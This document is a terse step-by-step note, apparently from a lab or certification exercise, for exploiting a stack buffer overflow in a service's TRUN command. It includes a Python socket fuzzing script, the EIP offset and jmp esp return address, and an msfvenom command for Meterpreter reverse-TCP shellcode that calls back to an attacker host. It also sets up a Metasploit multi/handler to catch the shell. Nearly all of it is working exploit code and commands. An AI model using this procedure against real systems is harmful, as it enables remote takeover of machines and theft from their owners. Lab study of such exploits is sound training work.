immunity
    file attatch
    run file
    attach
    play
vim win_buf.py
    #!/usr/bin/python
    import socket

    buf= "TRUN /.:/"
    buf += "A" * 5000

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.65.10", 9999)) #CONNECT TO TGT IP
    print s.recv(1024)
    s.send(buf)
    print s.recv(1024)
    s.close()

wiremask len 5000
copy and put in Place of A

Run script
Go to windows device
Immunity
    !mona jmp -r esp -m"essfunc.dll"
    go to cpu window
        get EIP value
        put into WIREMASK
Put result into your script
    buf += "A"* 2003
    buf += "BBBB"
    write to script
    
REWIND in immunity and check eip for 42424242
copy address from log data
input in script in place of bbbb
    buf += "\xAF\x11\x50\x62"

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.65.20 lport=4444 -b "\x00" -f python
    get shell code
copy into script below jmp esp
put in nop sled above shell code
    buf += "\x90" * 10

SET UP MULTIHANDLER
    NEw linops window
    msfconsole
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost 0.0.0.0
        set lport 4444
        run
launch exploit (run python script)



Troubleshooting
    Public IP in msfvenom
    RERUN shellcode
    check ports for correct tunnels
    
